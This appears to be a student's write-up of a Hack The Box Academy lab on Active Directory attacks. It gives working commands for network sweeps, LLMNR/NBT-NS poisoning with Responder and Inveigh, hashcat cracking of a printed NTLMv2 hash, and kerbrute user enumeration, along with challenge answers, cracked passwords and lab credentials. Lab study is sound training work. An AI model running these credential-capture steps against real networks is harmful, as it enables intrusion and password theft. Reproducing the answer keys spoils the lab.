# HTB-Active_Directory_Enumeration_and_Attacks

## Table of Contents
1. [Initial Enumeration](#initial-enumeration)
    1. [External Recon and Enumeration Principles](#external-recon-and-enumeration-principles)
    2. [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
2. [Sniffing out a Foothold](#sniffing-out-a-foothold)
    1. [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
    2. [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
3. [Sighting In, Hunting For A User](#sighting-in-hunting-for-a-user)
    1. [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
    2. [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)

## Initial Enumeration
### External Recon and Enumeration Principles
#### Tools
1. [View DNS Info](https://viewdns.info/)
#### Challenges
1. While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )

    We can go to this [wesbite](https://viewdns.info/), choose DNS record section. In there, type `inlanefreight.com`. We can see the answer is `HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}`.

    ![alt text](Assets/ExRecon1.png)

### Initial Enumeration of the Domain
#### Challenges
1. From your scans, what is the "commonName" of host 172.16.5.5 ?

    First we ssh with credential provided and run `nmap` to scan `172.16.5.5`. We can look for the field inside digital certificate to find the answer. The answer is `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`.

    ![alt text](Assets/InEnum1.png)

2. What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)

    If we check with `ifconfig`, we can see `ens224` netwrok interfaces. It is its internal network, so we can do ping sweeping to `172.16.5.0/23`.

    ```bash
    fping -asgq 172.16.5.0/23
    ```
    ![alt text](Assets/InEnum2.png)

    The scan gave us 3 ip results. We can test each of that with nmap to find which host is running `Microsoft SQL Server 2019` service. The answer is `172.16.5.130`.

## Sniffing out a Foothold
### LLMNR/NBT-NS Poisoning - from Linux
#### Tools
1. responder
#### Challenges
1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

    First we need to ssh with the credential provided. Then we can responder to capture the hash.

    ```bash
    sudo responder -I ens224 
    ```
    After that go to `/usr/share/responder/logs` directory. We will find `SMB-NTLMv2*.txt` file. In there we can find the user that we searched. The answer is `backupagent`.

2. Crack the hash for the previous account and submit the cleartext password as your answer.

    One of the captured hash is like this.

    ```bash
    backupagent::INLANEFREIGHT:7aea7c5d1ba836c8:C4104093906F3BB0B6A5B9A1EC0309A6:010100000000000000083632DA4ADC014380A34FA2FFDCB80000000002000800380037004800460001001E00570049004E002D0033003300360042004C004A003800380046004500320004003400570049004E002D0033003300360042004C004A00380038004600450032002E0038003700480046002E004C004F00430041004C000300140038003700480046002E004C004F00430041004C000500140038003700480046002E004C004F00430041004C000700080000083632DA4ADC0106000400020000000800300030000000000000000000000000300000379D6555F66E3E7DECDC07D73FB639A537E1BF850FED1D146E763E4276C51B320A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
    ```
    We can save it and crack it by using hashcat.

    ```bash
    hashcat -m 5600 backupagent_ntlmv2 /usr/share/wordlists/rockyou.txt
    ```
    The answer is `h1backup55`.

3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

    We can do exactly like question number 2 but with user `wley`. The answer is `transporter@4`.

### LLMNR/NBT-NS Poisoning - from Windows
#### Tools
1. Inveigh
#### Challenges
1. Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.

    First we need to rdp with provided credential.
    
    ```bash
    xfreerdp /v:10.129.48.82 /u:htb-student /p:Academy_student_AD! /dynamic-resolution
    ```
    Then in the rdp session, go to Tools folder. In there, we can find `inveigh.exe`. After we run it, press `esc` to interact on it. We can type `GET NTLMV2UNIQUE` to get all user with its hash. Then we can use hashcat to crack it. The answer is `security#1`.

## Sighting In, Hunting For A User
### Enumerating & Retrieving Password Policies
#### Tools
1. ldapsearch
#### Challenges
1. What is the default Minimum password length when a new domain is created? (One number)

    We can find this answer from the module.

    ![alt text](Assets/EnumPWDPolicies.png)

    The answer is `7`.

2. What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)

    We can use `ldapsearch` to solve this.
    
    ```bash
    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 minPwdLength
    ```
    The answer is `8`.

### Password Spraying - Making a Target User List
#### Tools
1. kerbrute
#### Challenges
1. Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

    We can solve this by using `kerbrute`.

    ```bash
    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
    ```
    The answer is `56`.